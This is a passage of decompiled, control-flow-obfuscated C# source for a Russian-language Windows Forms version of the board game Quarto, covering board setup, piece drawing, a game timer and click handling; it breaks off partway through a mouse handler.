using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			Dark = dark;
			Big = big;
			Square = square;
			Point = point;
		}

		public Figurine(Figurine copy)
		{
			Dark = copy.Dark;
			Big = copy.Big;
			Square = copy.Square;
			Point = copy.Point;
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_021e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0228: Expected O, but got Unknown
		int num3 = default(int);
		int num6 = default(int);
		double num9 = default(double);
		bool flag = default(bool);
		while (true)
		{
			int num = -609585417;
			while (true)
			{
				uint num2;
				double num10;
				PictureBox[,] array2;
				int num11;
				int num12;
				PictureBox obj2;
				switch ((num2 = (uint)num ^ 0xFD173572u) % 24u)
				{
				case 23u:
					pictureBox = new PictureBox[4, 4];
					num = ((int)num2 * -604594907) ^ 0x41D3F755;
					continue;
				case 22u:
					num3++;
					num = ((int)num2 * -702128654) ^ 0x658C9297;
					continue;
				case 21u:
					num = (int)((num2 * 351774524) ^ 0x704C8928);
					continue;
				case 20u:
					borderBox = new PictureBox[4, 4];
					num = (int)((num2 * 1863324352) ^ 0x15A6D28D);
					continue;
				case 19u:
				{
					PictureBox[,] array = borderBox;
					int num7 = num6;
					int num8 = num3;
					PictureBox obj = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj, new Size(size - 2, size - 2));
					Form1.smethod_4((Control)(object)obj, new Point(1 + (int)(((double)num3 + num9) * (double)size), 1 + num6 * size));
					Form1.smethod_7((Control)(object)obj, bool_0: false);
					array[num7, num8] = obj;
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[num6, num3]);
					num = (int)(num2 * 1693860065) ^ -1403852075;
					continue;
				}
				case 18u:
					InitializeComponent();
					num = (int)(num2 * 218141270) ^ -1224615108;
					continue;
				case 16u:
					num6++;
					num = ((int)num2 * -815816449) ^ 0x42A13594;
					continue;
				case 15u:
					num6 = 0;
					num = (int)(num2 * 1708604885) ^ -404143316;
					continue;
				case 14u:
				{
					int num13;
					if (num6 >= 4)
					{
						num = -1512204211;
						num13 = -1512204211;
					}
					else
					{
						num = -287217670;
						num13 = -287217670;
					}
					continue;
				}
				case 13u:
					num = (int)(num2 * 1036421880) ^ -1822979752;
					continue;
				case 12u:
					num = ((int)num2 * -2019530534) ^ 0x15932FA6;
					continue;
				case 11u:
					num10 = 4.1;
					goto IL_01ad;
				case 10u:
					num = -1528857342;
					continue;
				case 9u:
					flag = num3 < 4;
					num = -835317333;
					continue;
				case 8u:
					if (num3 >= 2)
					{
						num = (int)((num2 * 1124685761) ^ 0x6B49B191);
						continue;
					}
					num10 = 0.0;
					goto IL_01ad;
				case 7u:
				{
					Form3 form_ = new Form3();
					Form1.smethod_10((Form)(object)form_, (Form)(object)this);
					menu = (Form)(object)form_;
					Form1.smethod_11((Control)(object)menu);
					num = ((int)num2 * -624030943) ^ -2093296762;
					continue;
				}
				case 6u:
					num = ((int)num2 * -2070466092) ^ -168462956;
					continue;
				case 5u:
					Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
					num = ((int)num2 * -2097160073) ^ -1867831450;
					continue;
				case 4u:
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[num6, num3]);
					num = (int)(num2 * 859589672) ^ -1873223780;
					continue;
				case 2u:
					num = ((int)num2 * -229302293) ^ 0x8031F91;
					continue;
				case 1u:
				{
					int num4;
					int num5;
					if (flag)
					{
						num4 = 1475345285;
						num5 = 1475345285;
					}
					else
					{
						num4 = 832778047;
						num5 = 832778047;
					}
					num = num4 ^ ((int)num2 * -1700061883);
					continue;
				}
				case 0u:
					num3 = 0;
					num = -279025269;
					continue;
				default:
					return;
				case 17u:
					break;
				case 3u:
					return;
					IL_01ad:
					num9 = num10;
					array2 = pictureBox;
					num11 = num6;
					num12 = num3;
					obj2 = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj2, new Size(size - 8, size - 8));
					Form1.smethod_4((Control)(object)obj2, new Point(4 + (int)(((double)num3 + num9) * (double)size), 4 + num6 * size));
					Form1.smethod_5((Control)(object)obj2, Color.White);
					array2[num11, num12] = obj2;
					Form1.smethod_6((Control)(object)pictureBox[num6, num3], new MouseEventHandler(PictureBoxIJ_MouseDown));
					num = -1771355503;
					continue;
				}
				break;
			}
		}
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
		while (true)
		{
			int num = -2018149159;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x9222A310u) % 3u)
				{
				case 2u:
					goto IL_0033;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
				}
				break;
				IL_0033:
				num = ((int)num2 * -1423940337) ^ -628629924;
			}
		}
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
		while (true)
		{
			int num = -2129184057;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xCDAC05B3u) % 3u)
				{
				case 1u:
					goto IL_000d;
				default:
					return;
				case 2u:
					break;
				case 0u:
					return;
				}
				break;
				IL_000d:
				num = (int)(num2 * 1616117877) ^ -1234442234;
			}
		}
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = -1639222158;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xDCF0E487u) % 11u)
				{
				case 10u:
					num = -1651861319;
					continue;
				case 9u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = ((int)num2 * -2006947489) ^ -933999876;
					continue;
				}
				case 8u:
					num = ((int)num2 * -147926961) ^ 0x45FEAD8D;
					continue;
				case 6u:
					Form1.smethod_15(timer1);
					num = ((int)num2 * -1726063997) ^ 0x1F5D14AC;
					continue;
				case 5u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = -253639061;
						num4 = -253639061;
					}
					else
					{
						num3 = -1750649048;
						num4 = -1750649048;
					}
					num = num3 ^ (int)(num2 * 1754470676);
					continue;
				}
				case 4u:
					num = ((int)num2 * -452413899) ^ 0x1F01AD1F;
					continue;
				case 3u:
					num = ((int)num2 * -2003009300) ^ -120397558;
					continue;
				case 1u:
					flag = Form1.smethod_16((Control)(object)menu) < 296;
					num = -545765708;
					continue;
				case 0u:
					Form1.smethod_14(menu);
					num = ((int)num2 * -1076104541) ^ -1457786552;
					continue;
				default:
					return;
				case 2u:
					break;
				case 7u:
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		board = new Figurine[4, 4];
		bool flag = default(bool);
		int num3 = default(int);
		int num6 = default(int);
		bool flag2 = default(bool);
		while (true)
		{
			int num = -35583337;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x91BDFAB4u) % 22u)
				{
				case 21u:
					flag = num3 < 4;
					num = -1898063207;
					continue;
				case 20u:
					Form1.smethod_7((Control)(object)pictureBox[num6, num3], bool_0: false);
					num3++;
					num = ((int)num2 * -839975885) ^ -209104463;
					continue;
				case 19u:
					num6++;
					num = (int)(num2 * 421924641) ^ -2123643913;
					continue;
				case 18u:
					storage[num6, num3] = new Figurine(num6 < 2, num3 % 2 == 0, num3 < 2, num6 % 2 == 1);
					Form1.smethod_5((Control)(object)borderBox[num6, num3], Color.White);
					num = (int)((num2 * 939600887) ^ 0x755D9A89);
					continue;
				case 17u:
				{
					int num7;
					int num8;
					if (!flag2)
					{
						num7 = -1895202981;
						num8 = -1895202981;
					}
					else
					{
						num7 = -1142043973;
						num8 = -1142043973;
					}
					num = num7 ^ (int)(num2 * 1452251135);
					continue;
				}
				case 15u:
					num = -35762600;
					continue;
				case 14u:
					num6 = 0;
					num = (int)(num2 * 15984454) ^ -117590385;
					continue;
				case 13u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -914431397) ^ -1876549337;
					continue;
				case 11u:
					storage = new Figurine[4, 4];
					num = (int)(num2 * 470187494) ^ -181804366;
					continue;
				case 10u:
					flag2 = num6 < 4;
					num = -1946016009;
					continue;
				case 9u:
					Paint_Storage();
					num = (int)(num2 * 683295169) ^ -6845085;
					continue;
				case 8u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = (int)(num2 * 1652125218) ^ -524462152;
					continue;
				case 7u:
					num = ((int)num2 * -1840435818) ^ -1585641650;
					continue;
				case 6u:
					num = (int)((num2 * 1958636100) ^ 0x5CD29F85);
					continue;
				case 5u:
				{
					int num4;
					int num5;
					if (flag)
					{
						num4 = 1293077758;
						num5 = 1293077758;
					}
					else
					{
						num4 = 1084962766;
						num5 = 1084962766;
					}
					num = num4 ^ (int)(num2 * 1469294721);
					continue;
				}
				case 4u:
					Paint_Board();
					num = ((int)num2 * -1114197244) ^ 0x7090CCD8;
					continue;
				case 3u:
					num = (int)(num2 * 1558731249) ^ -1029923078;
					continue;
				case 2u:
					num3 = 0;
					num = -999480421;
					continue;
				case 1u:
					num = ((int)num2 * -63496779) ^ 0x2DEBA6DF;
					continue;
				case 0u:
					num = ((int)num2 * -479619444) ^ -808120269;
					continue;
				default:
					return;
				case 16u:
					break;
				case 12u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		bool flag2 = default(bool);
		bool point = default(bool);
		Graphics graphics_ = default(Graphics);
		Brush brush_ = default(Brush);
		float num11 = default(float);
		int num6 = default(int);
		int num3 = default(int);
		float num13 = default(float);
		float num10 = default(float);
		float num14 = default(float);
		float num12 = default(float);
		bool flag = default(bool);
		bool square = default(bool);
		while (true)
		{
			int num = 1350880397;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x3F8F51E5u) % 38u)
				{
				case 37u:
				{
					int num8;
					int num9;
					if (!flag2)
					{
						num8 = -1025539089;
						num9 = -1025539089;
					}
					else
					{
						num8 = -1673980249;
						num9 = -1673980249;
					}
					num = num8 ^ (int)(num2 * 60749868);
					continue;
				}
				case 36u:
				{
					int num20;
					int num21;
					if (point)
					{
						num20 = 1214537472;
						num21 = 1214537472;
					}
					else
					{
						num20 = 1397214834;
						num21 = 1397214834;
					}
					num = num20 ^ (int)(num2 * 1285400381);
					continue;
				}
				case 35u:
					Form1.smethod_24(graphics_, brush_, num11 + (float)(num6 * size), num11 + (float)(num3 * size), num13, num13);
					num = 1097186814;
					continue;
				case 34u:
				{
					int num18;
					int num19;
					if (!board[num3, num6].Dark)
					{
						num18 = 1502788657;
						num19 = 1502788657;
					}
					else
					{
						num18 = 501938039;
						num19 = 501938039;
					}
					num = num18 ^ (int)(num2 * 1310304950);
					continue;
				}
				case 33u:
					num10 = 1f - num14 * 0.9f / (float)Form1.smethod_27(2.0);
					num = 1143214267;
					continue;
				case 32u:
					num11 = (float)size * (num10 / 2f);
					num13 = num12 * 0.4f / (float)Form1.smethod_27(2.0);
					num = ((int)num2 * -1394780193) ^ 0x50003468;
					continue;
				case 31u:
				{
					int num7;
					if (board[num3, num6].Big)
					{
						num = 1666651481;
						num7 = 1666651481;
					}
					else
					{
						num = 616164610;
						num7 = 616164610;
					}
					continue;
				}
				case 30u:
					brush_ = Form1.smethod_26();
					num = 428958278;
					continue;
				case 29u:
					point = board[num3, num6].Point;
					num = (int)((num2 * 1626194664) ^ 0x6D9ED94D);
					continue;
				case 28u:
					flag2 = board[num3, num6] != null;
					num = (int)(num2 * 1956579308) ^ -283364212;
					continue;
				case 26u:
					num3 = 0;
					num = (int)((num2 * 1464062778) ^ 0x651BDFEB);
					continue;
				case 25u:
				{
					int num17;
					if (num6 < 4)
					{
						num = 2037663480;
						num17 = 2037663480;
					}
					else
					{
						num = 550080977;
						num17 = 550080977;
					}
					continue;
				}
				case 24u:
					num6 = 0;
					num = 357424180;
					continue;
				case 23u:
					num = ((int)num2 * -76290798) ^ -1751412099;
					continue;
				case 22u:
					Form1.smethod_28(graphics_, brush_, num11 + (float)(num6 * size), num11 + (float)(num3 * size), num13, num13);
					num = ((int)num2 * -833617618) ^ -754701414;
					continue;
				case 21u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num11 + (float)(num6 * size), num11 + (float)(num3 * size), num13, num13);
					num = ((int)num2 * -1969606145) ^ -1994939031;
					continue;
				case 20u:
					num12 = (float)size * num14;
					num = (int)((num2 * 869151614) ^ 0x61A7A807);
					continue;
				case 19u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = (int)(num2 * 1203919853) ^ -1815583078;
					continue;
				case 18u:
					brush_ = Form1.smethod_25();
					num = ((int)num2 * -1725019927) ^ -68811132;
					continue;
				case 17u:
					num = (int)((num2 * 1328807179) ^ 0x17979140);
					continue;
				case 16u:
					num14 = 1f;
					num = (int)(num2 * 1706773320) ^ -1044866229;
					continue;
				case 15u:
					num = 1243343363;
					continue;
				case 14u:
					num6++;
					num = 357424180;
					continue;
				case 12u:
					Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
					num = (int)((num2 * 5064081) ^ 0x728FA932);
					continue;
				case 11u:
					num = ((int)num2 * -272583494) ^ -322994896;
					continue;
				case 10u:
					num3++;
					num = (int)((num2 * 26512051) ^ 0x5710890);
					continue;
				case 9u:
				{
					int num15;
					int num16;
					if (flag)
					{
						num15 = 708755986;
						num16 = 708755986;
					}
					else
					{
						num15 = 1842877743;
						num16 = 1842877743;
					}
					num = num15 ^ ((int)num2 * -361679945);
					continue;
				}
				case 8u:
					num10 = 1f - num14 * 0.4f / (float)Form1.smethod_27(2.0);
					num = 848312445;
					continue;
				case 7u:
					num14 = 0.7f;
					num = 1645956806;
					continue;
				case 6u:
					num11 = (float)size * (num10 / 2f);
					num13 = num12 * 0.9f / (float)Form1.smethod_27(2.0);
					square = board[num3, num6].Square;
					num = ((int)num2 * -738411411) ^ 0x1AB91B87;
					continue;
				case 5u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num6 + 0.05f) * (float)size, ((float)num3 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = 1278141128;
					continue;
				case 4u:
				{
					int num4;
					int num5;
					if (!square)
					{
						num4 = 1052678532;
						num5 = 1052678532;
					}
					else
					{
						num4 = 481058857;
						num5 = 481058857;
					}
					num = num4 ^ (int)(num2 * 745132305);
					continue;
				}
				case 3u:
					flag = num3 < 4;
					num = 394018874;
					continue;
				case 2u:
					num = (int)((num2 * 291294268) ^ 0x21165964);
					continue;
				case 1u:
					num = (int)(num2 * 450666944) ^ -2058744613;
					continue;
				case 0u:
					num = ((int)num2 * -1317629846) ^ -413246838;
					continue;
				case 27u:
					break;
				default:
					Form1.smethod_30((Control)(object)pictureBox1);
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		int num = 0;
		Brush brush_ = default(Brush);
		bool big = default(bool);
		bool flag2 = default(bool);
		int num6 = default(int);
		float num13 = default(float);
		float num10 = default(float);
		float num8 = default(float);
		float num7 = default(float);
		Graphics graphics_ = default(Graphics);
		bool dark = default(bool);
		float num9 = default(float);
		while (true)
		{
			bool flag = num < 4;
			int num2 = -379863913;
			while (true)
			{
				uint num3;
				switch ((num3 = (uint)num2 ^ 0x8AD2A1B7u) % 36u)
				{
				case 35u:
					brush_ = Form1.smethod_25();
					num2 = ((int)num3 * -1237558671) ^ -1532993608;
					continue;
				case 34u:
				{
					int num19;
					int num20;
					if (big)
					{
						num19 = -212343433;
						num20 = -212343433;
					}
					else
					{
						num19 = -1227261281;
						num20 = -1227261281;
					}
					num2 = num19 ^ (int)(num3 * 1118714825);
					continue;
				}
				case 33u:
					flag2 = num6 < 4;
					num2 = -985491316;
					continue;
				case 32u:
					num2 = -2104575979;
					continue;
				case 31u:
					num13 = (float)size * (num10 / 2f) - 4f;
					num8 = num7 * 0.4f / (float)Form1.smethod_27(2.0);
					num2 = ((int)num3 * -1077310014) ^ 0x3698FB1C;
					continue;
				case 30u:
					num2 = ((int)num3 * -923349961) ^ 0x4D61E1AC;
					continue;
				case 29u:
				{
					int num15;
					int num16;
					if (!storage[num, num6].Point)
					{
						num15 = 1520110117;
						num16 = 1520110117;
					}
					else
					{
						num15 = 1193086222;
						num16 = 1193086222;
					}
					num2 = num15 ^ (int)(num3 * 1640256540);
					continue;
				}
				case 28u:
					num2 = (int)(num3 * 718614511) ^ -1042462734;
					continue;
				case 27u:
					num13 = (float)size * (num10 / 2f) - 4f;
					num2 = (int)((num3 * 1729206504) ^ 0x24664052);
					continue;
				case 26u:
					num2 = (int)((num3 * 1229669882) ^ 0x51BD490E);
					continue;
				case 25u:
					num6++;
					num2 = -338038314;
					continue;
				case 24u:
					big = storage[num, num6].Big;
					num2 = -1275421479;
					continue;
				case 23u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num, num6]));
					dark = storage[num, num6].Dark;
					num2 = (int)(num3 * 1907269612) ^ -1168525101;
					continue;
				case 21u:
					num8 = num7 * 0.9f / (float)Form1.smethod_27(2.0);
					num2 = ((int)num3 * -1546219185) ^ 0x6938E40E;
					continue;
				case 20u:
					num++;
					num2 = (int)(num3 * 1788773348) ^ -147780120;
					continue;
				case 19u:
					Form1.smethod_24(graphics_, brush_, num13, num13, num8, num8);
					num2 = -815064694;
					continue;
				case 18u:
				{
					int num21;
					int num22;
					if (num6 >= 2)
					{
						num21 = -1350813172;
						num22 = -1350813172;
					}
					else
					{
						num21 = -261438720;
						num22 = -261438720;
					}
					num2 = num21 ^ ((int)num3 * -853651480);
					continue;
				}
				case 17u:
					num10 = 1f - num9 * 0.9f / (float)Form1.smethod_27(2.0);
					num7 = (float)size * num9;
					num2 = -1839236824;
					continue;
				case 16u:
					num2 = (int)(num3 * 2146442893) ^ -1402315165;
					continue;
				case 15u:
				{
					int num17;
					int num18;
					if (!flag2)
					{
						num17 = 1029609623;
						num18 = 1029609623;
					}
					else
					{
						num17 = 644863180;
						num18 = 644863180;
					}
					num2 = num17 ^ ((int)num3 * -1814138976);
					continue;
				}
				case 14u:
					num6 = 0;
					num2 = -338038314;
					continue;
				case 13u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num13, num13, num8, num8);
					num2 = ((int)num3 * -85345337) ^ 0x615C01DA;
					continue;
				case 12u:
					Form1.smethod_20(pictureBox[num, num6], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num, num6]), Form1.smethod_16((Control)(object)pictureBox[num, num6])));
					num2 = (int)((num3 * 1439989615) ^ 0x6DBFF298);
					continue;
				case 11u:
				{
					int num14;
					if (storage[num, num6] == null)
					{
						num2 = -126186538;
						num14 = -126186538;
					}
					else
					{
						num2 = -1099844745;
						num14 = -1099844745;
					}
					continue;
				}
				case 10u:
					num9 = 0.7f;
					num2 = -1299929162;
					continue;
				case 9u:
					num2 = (int)(num3 * 1544704522) ^ -1546106440;
					continue;
				case 8u:
					num2 = (int)((num3 * 769458380) ^ 0x5DF6A243);
					continue;
				case 7u:
					Form1.smethod_28(graphics_, brush_, num13, num13, num8, num8);
					num2 = ((int)num3 * -278105122) ^ -250295085;
					continue;
				case 6u:
					num9 = 1f;
					num2 = (int)((num3 * 329889621) ^ 0x44590B77);
					continue;
				case 5u:
					brush_ = Form1.smethod_26();
					num2 = -958066521;
					continue;
				case 4u:
				{
					int num11;
					int num12;
					if (dark)
					{
						num11 = 643663868;
						num12 = 643663868;
					}
					else
					{
						num11 = 1412761094;
						num12 = 1412761094;
					}
					num2 = num11 ^ ((int)num3 * -1355817806);
					continue;
				}
				case 2u:
					Form1.smethod_30((Control)(object)pictureBox[num, num6]);
					num2 = -669584469;
					continue;
				case 1u:
					num10 = 1f - num9 * 0.4f / (float)Form1.smethod_27(2.0);
					num2 = -1166996580;
					continue;
				case 0u:
				{
					int num4;
					int num5;
					if (!flag)
					{
						num4 = 434957897;
						num5 = 434957897;
					}
					else
					{
						num4 = 1742469877;
						num5 = 1742469877;
					}
					num2 = num4 ^ (int)(num3 * 703036159);
					continue;
				}
				default:
					return;
				case 3u:
					break;
				case 22u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		Form1_Load(this, Form1.smethod_31());
		int num3 = default(int);
		bool flag = default(bool);
		int num4 = default(int);
		bool flag2 = default(bool);
		int num8 = default(int);
		while (true)
		{
			int num = 1607947345;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x1789F00Bu) % 27u)
				{
				case 26u:
					num3 = 0;
					num = ((int)num2 * -1272960332) ^ 0x10DF103B;
					continue;
				case 25u:
					flag = num3 < 4;
					num = 1682188322;
					continue;
				case 24u:
					num3++;
					num = (int)((num2 * 2060603839) ^ 0x39D2FA23);
					continue;
				case 23u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					num = (int)((num2 * 935425170) ^ 0x28D3E6A5);
					continue;
				case 22u:
					num4++;
					num = ((int)num2 * -623383243) ^ -1762359406;
					continue;
				case 21u:
					flag2 = num4 < 4;
					num = 2080240832;
					continue;
				case 20u:
					num4 = 0;
					num = 1443098397;
					continue;
				case 19u:
				{
					int num7 = Form1.smethod_33(rnd, 4);
					Form1.smethod_5((Control)(object)borderBox[num8, num7], Color.Blue);
					num = ((int)num2 * -118808305) ^ 0x620821EF;
					continue;
				}
				case 18u:
					num = (int)((num2 * 1381416699) ^ 0x2ACE17E4);
					continue;
				case 17u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					time = new DateTime(0L, DateTimeKind.Unspecified);
					Form1.smethod_35(timer1, bool_0: true);
					num = 621873052;
					continue;
				case 16u:
					num = ((int)num2 * -493051275) ^ -451437732;
					continue;
				case 15u:
					step = 1;
					num = (int)(num2 * 1877951190) ^ -1822422281;
					continue;
				case 14u:
				{
					int num11;
					int num12;
					if (flag2)
					{
						num11 = 65649742;
						num12 = 65649742;
					}
					else
					{
						num11 = 39918176;
						num12 = 39918176;
					}
					num = num11 ^ ((int)num2 * -1662740340);
					continue;
				}
				case 13u:
					num8 = Form1.smethod_33(rnd, 4);
					num = 1633068171;
					continue;
				case 12u:
					Form1.smethod_36(timer1);
					num = (int)((num2 * 78162867) ^ 0x5BDDF788);
					continue;
				case 10u:
					num = ((int)num2 * -698886396) ^ 0x19A5D691;
					continue;
				case 9u:
				{
					int num9;
					int num10;
					if (!turn)
					{
						num9 = 832183054;
						num10 = 832183054;
					}
					else
					{
						num9 = 2116702529;
						num10 = 2116702529;
					}
					num = num9 ^ (int)(num2 * 1987467149);
					continue;
				}
				case 8u:
					num = (int)(num2 * 1869434910) ^ -1314876412;
					continue;
				case 7u:
				{
					int num5;
					int num6;
					if (!flag)
					{
						num5 = -1849234268;
						num6 = -1849234268;
					}
					else
					{
						num5 = -1471426417;
						num6 = -1471426417;
					}
					num = num5 ^ ((int)num2 * -1126469867);
					continue;
				}
				case 6u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = ((int)num2 * -1987006220) ^ -497943035;
					continue;
				case 5u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					step = 0;
					num = ((int)num2 * -385623987) ^ 0x5F2CC5CB;
					continue;
				case 4u:
					num = (int)(num2 * 1677540925) ^ -288135922;
					continue;
				case 3u:
					Form1.smethod_7((Control)(object)pictureBox[num3, num4], bool_0: true);
					num = 166809291;
					continue;
				case 2u:
					num = ((int)num2 * -936231074) ^ 0x416CCE38;
					continue;
				case 1u:
					num = ((int)num2 * -617112593) ^ -323818539;
					continue;
				default:
					return;
				case 11u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		while (true)
		{
			int num = -1176260034;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xCC4821F8u) % 4u)
				{
				case 3u:
					Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
					num = ((int)num2 * -1738904820) ^ -2066398783;
					continue;
				case 2u:
					time = time.AddSeconds(1.0);
					num = (int)((num2 * 923120211) ^ 0x43D0CCF9);
					continue;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
				}
				break;
			}
		}
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_029b: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b1: Expected O, but got Unknown
		int num8 = default(int);
		int num3 = default(int);
		int num4 = default(int);
		Point point = default(Point);
		bool flag3 = default(bool);
		int num6 = default(int);
		bool flag = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = 908331756;
			while (true)
			{
				uint num2;
				int num5;
				switch ((num2 = (uint)num ^ 0x3BE3835Du) % 25u)
				{
				case 24u:
					num8++;
					num = ((int)num2 * -1464234284) ^ 0x7CBCEEE6;
					continue;
				case 23u:
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.Red);
					num = ((int)num2 * -186273959) ^ -502908866;
					continue;
				case 22u:
					num = (int)(num2 * 2072681377) ^ -51089483;
					continue;
				case 21u:
					num3 = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null)).Y / size;
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = (int)((num2 * 1916310083) ^ 0x6746BBC7);
					continue;
				case 20u:
					num4 = point.X / size;
					flag3 = num4 > 1;
					num = (int)(num2 * 191048395) ^ -946070352;
					continue;
				case 19u:
				{
					int num11;
					int num12;
					if (flag3)
					{
						num11 = 1840548972;
						num12 = 1840548972;
					}
					else
					{
						num11 = 566058001;
						num12 = 566058001;
					}
					num = num11 ^ (int)(num2 * 635924152);
					continue;
				}
				case 18u:
				{
					int num7;
					if (num6 >= 4)
					{
						num = 1145328116;
						num7 = 1145328116;
					}
					else
					{
						num = 2004512284;
						num7 = 2004512284;
					}
					continue;
				}
				case 17u:
					num = ((int)num2 * -1041155621) ^ -1918041744;
					continue;
				case 16u:
					num = (int)((num2 * 1221102875) ^ 0x27110527);
					continue;
				case 15u:
				{
					int num13;
					int num14;
					if (!flag)
					{
						num13 = -1627004940;
						num14 = -1627004940;
					}
					else
					{
						num13 = -150073376;
						num14 = -150073376;
					}
					num = num13 ^ (int)(num2 * 2144190884);
					continue;
				}
				case 14u:
					num = ((int)num2 * -193343958) ^ -900336948;
					continue;
				case 13u:
				{
					int num9;
					int num10;
					if (flag2)
					{
						num9 = 1179063526;
						num10 = 1179063526;
					}
					else
					{
						num9 = 1676894705;
						num10 = 1676894705;
					}
					num = num9 ^ (int)(num2 * 944179827);
					continue;
				}
				case 11u:
					num8 = 0;
					num = 21338834;
					continue;
				case 10u:
					flag2 = num8 < 4;
					num = 1955675659;
					continue;
				case 9u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = (int)((num2 * 957889363) ^ 0x2BA4612C);
					continue;
				case 8u:
					num6 = 0;
					num = (int)(num2 * 638051257) ^ -2114776646;
					continue;
				case 7u:
					Form1.smethod_5((Control)(object)borderBox[num6, num8], Color.White);
					num = 979983630;
					continue;
				case 5u:
					num = ((int)num2 * -131918509) ^ 0x200AC533;
					continue;
				case 4u:
					num6++;
					num = ((int)num2 * -161237417) ^ -1503143298;
					continue;
				case 3u:
					num4 -= 4;
					num = (int)(num2 * 1699041387) ^ -1795386678;
					continue;
				case 2u:
					if (storage[num3, num4] != null)
					{
						num = 1965026195;
						continue;
					}
					num5 = 0;
					goto IL_0260;
				case 1u:
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = ((int)num2 * -919942943) ^ 0x4DCD0B26;
					continue;
				case 0u:
					num5 = ((Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num3, num4]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0)) ? 1 : 0);
					goto IL_0260;
				default:
					return;
				case 6u:
					break;
				case 12u:
					return;
					IL_0260:
					flag = (byte)num5 != 0;
					num = 2125700698;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_00f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_010c: Expected O, but got Unknown
		Graphics graphics_ = default(Graphics);
		bool flag2 = default(bool);
		int num5 = default(int);
		int num6 = default(int);
		int num8 = default(int);
		int num9 = default(int);
		bool flag = default(bool);
		bool flag3 = default(bool);
		while (true)
		{
			int num = -1787572357;
			while (true)
			{
				uint num2;
				int num7;
				switch ((num2 = (uint)num ^ 0xF35E032Bu) % 29u)
				{
				case 27u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = (int)((num2 * 1458800651) ^ 0x44869A40);
					continue;
				case 26u:
					num = (int)((num2 * 1933506348) ^ 0x10A475D2);
